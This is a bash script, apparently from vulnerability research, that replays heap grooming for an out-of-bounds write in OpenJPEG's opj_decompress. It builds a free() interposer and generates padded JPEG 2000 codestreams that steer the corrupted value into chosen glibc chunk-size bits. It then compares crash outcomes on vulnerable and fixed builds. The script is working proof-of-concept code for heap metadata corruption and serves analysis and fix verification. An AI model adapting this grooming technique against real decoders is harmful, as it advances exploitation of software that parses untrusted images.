#!/usr/bin/env bash
# Low-bit grooming replay for OSV-2025-219 on this host's glibc 2.39.
# Bounded question: can COM padding tune the OOB-written stream offset into a
# chosen glibc chunk-size word, and what does the real free() do with it?
# All local process only; loopback/network never touched.
# Requires the pinned builds produced by `bash run.sh <dir>` first.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out-groom"}
OUT=$(mkdir -p "$OUT" && cd "$OUT" && pwd) || exit 2
cd "$HERE" || exit 2
V=$HERE/out-w75/build/vuln-plain/bin/opj_decompress
F=$HERE/out-w75/build/fixed-plain/bin/opj_decompress
if [ ! -x "$V" ] || [ ! -x "$F" ]; then
  echo "missing pinned builds: run 'bash run.sh $HERE/out-w75' first" >&2
  exit 2
fi

# Build the allocation observer: logs each free() with its chunk-size word.
cat > "$OUT/watchfree.c" <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <stdint.h>
void free(void *p) {
    static void (*rf)(void*);
    static int busy;
    if (!rf && !busy) { busy = 1; rf = (void(*)(void*))dlsym(RTLD_NEXT, "free"); busy = 0; }
    if (p) {
        unsigned long sz = *(unsigned long*)((char*)p - 8);
        if ((sz >= 0xb0 && sz <= 0xc0) || sz == 0x151)
            fprintf(stderr, "FREEWATCH p=%p size=0x%lx\n", p, sz);
    }
    rf(p);
}
EOF
gcc -shared -fPIC -O2 -o "$OUT/watchfree.so" "$OUT/watchfree.c" -ldl || exit 2

# Insert a benign COM segment of N filler bytes before the TLM marker. The
# inserted segment is 6+N bytes, so the second tile-part's SOD offset (the
# end_header value that the OOB writes to the chunk-size word) is 177+N.
python3 - "$OUT" <<'PY'
import sys
out = sys.argv[1]
d = open(out + '/../src/poc.j2k', 'rb').read()
tlm = d.index(bytes.fromhex('ff55'))
for n in range(17):
    com = bytes.fromhex('ff64') + (4 + n).to_bytes(2, 'big') + b'\x00\x00' + b'A' * n
    open('%s/n%02d.j2k' % (out, n), 'wb').write(d[:tlm] + com + d[tlm:])
PY

: > "$OUT/results.tmp"
pass=0; fail=0
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
check() {
  if [ "$2" = 1 ]; then echo "PASS $1" | tee -a "$OUT/results.tmp"; pass=$((pass+1))
  else echo "FAIL $1" | tee -a "$OUT/results.tmp"; fail=$((fail+1)); fi
}

run() { # N, binary -> log; prints rc
  local n=$1 bin=$2 tag=$3
  LD_PRELOAD="$OUT/watchfree.so" "$bin" -i "$OUT/n$n.j2k" -o "$OUT/n$n.$tag.tif" \
    > "$OUT/n$n.$tag.log" 2>&1
  echo $?
}

echo "N  pos2  rc   FREEWATCH(size)      outcome"
for n in 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16; do
  rc=$(run "$n" "$V" sweep)
  sz=$(grep -oE 'FREEWATCH p=[^ ]+ size=0x[0-9a-f]+' "$OUT/n$n.sweep.log" | tail -1 | grep -oE '0x[0-9a-f]+$')
  msg=$(grep -oE 'munmap_chunk\(\): invalid pointer' "$OUT/n$n.sweep.log" | head -1)
  printf '%s  %4d  %3s   %-18s %s\n' "$n" "$((177+10#$n))" "$rc" "${sz:-none}" "${msg:-clean}"
done

# Representative, independently checked outcomes.
rc0=$(run 00 "$V" chk); l0=$(cat "$OUT/n00.chk.log")
check "N=0 (size 0xb1): free accepts corrupted size, decoder completes rc=0" \
  "$([ "$rc0" = 0 ] && contains 'size=0xb1' "$l0" && contains 'Generated Outfile' "$l0" && echo 1 || echo 0)"

rc1=$(run 01 "$V" chk); l1=$(cat "$OUT/n01.chk.log")
check "N=1 (size 0xb2, IS_MMAPPED): munmap_chunk abort rc=134" \
  "$([ "$rc1" = 134 ] && contains 'size=0xb2' "$l1" && contains 'munmap_chunk(): invalid pointer' "$l1" && echo 1 || echo 0)"

rc3=$(run 03 "$V" chk); l3=$(cat "$OUT/n03.chk.log")
check "N=3 (size 0xb4, PREV_INUSE clear): allocator SIGSEGV rc=139" \
  "$([ "$rc3" = 139 ] && contains 'size=0xb4' "$l3" && echo 1 || echo 0)"

# Determinism of the two failure classes.
r1b=$(run 01 "$V" rep); r3b=$(run 03 "$V" rep)
check "abort and SIGSEGV classes are deterministic on repeat" \
  "$([ "$r1b" = 134 ] && [ "$r3b" = 139 ] && echo 1 || echo 0)"

# Fixed-pin control on the aborting codestream.

frc=$("$F" -i "$OUT/n01.j2k" -o "$OUT/fixed.tif" > "$OUT/fixed.log" 2>&1; echo $?)
fl=$(cat "$OUT/fixed.log")
check "fixed pin 91d08b11 decodes the N=1 codestream cleanly (rc=0)" \
  "$([ "$frc" = 0 ] && contains 'Generated Outfile' "$fl" && \
    ! contains 'munmap_chunk' "$fl" && ! contains 'invalid pointer' "$fl" && echo 1 || echo 0)"

trace=$(grep '^PASS ' "$OUT/results.tmp" | sha256sum | cut -d' ' -f1)
echo "TRACE $trace"
echo "RESULT $pass PASS / $fail FAIL"
[ "$fail" = 0 ]
